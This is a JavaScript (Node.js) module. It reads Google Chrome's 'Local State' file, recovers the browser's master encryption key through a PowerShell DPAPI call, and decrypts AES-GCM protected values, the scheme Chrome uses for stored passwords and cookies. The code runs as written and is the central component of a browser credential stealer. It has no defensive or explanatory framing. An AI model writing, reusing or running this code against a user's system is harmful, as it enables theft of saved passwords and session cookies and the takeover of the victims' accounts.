const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

const LOCAL_STATE_PATH = path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data', 'Local State');

function getWindowsKey() {
    try {
        const { execSync } = require('child_process');
        const localState = JSON.parse(fs.readFileSync(LOCAL_STATE_PATH, 'utf8'));
        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
        const keyWithoutPrefix = encryptedKey.slice(5);
        
        const b64In = keyWithoutPrefix.toString('base64');
        const psScript = `Add-Type -AssemblyName System.Security; $in = [Convert]::FromBase64String('${b64In}'); $out = [System.Security.Cryptography.ProtectedData]::Unprotect($in, $null, 'CurrentUser'); [Convert]::ToBase64String($out)`;
        
        const output = execSync(`powershell -NoProfile -Command "${psScript}"`).toString().trim();
        return Buffer.from(output, 'base64');
    } catch (e) {
        console.error("Failed to get Windows DPAPI key. Error:", e.message);
        process.exit(1);
    }
}

function decryptWin(buf, key) {
    try {
        const iv = buf.slice(3, 15);
        const payload = buf.slice(15, buf.length - 16);
        const authTag = buf.slice(buf.length - 16);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(authTag);
        return decipher.update(payload, undefined, 'utf8') + decipher.final('utf8');
    } catch { return ''; }
}

module.exports = { getWindowsKey, decryptWin };
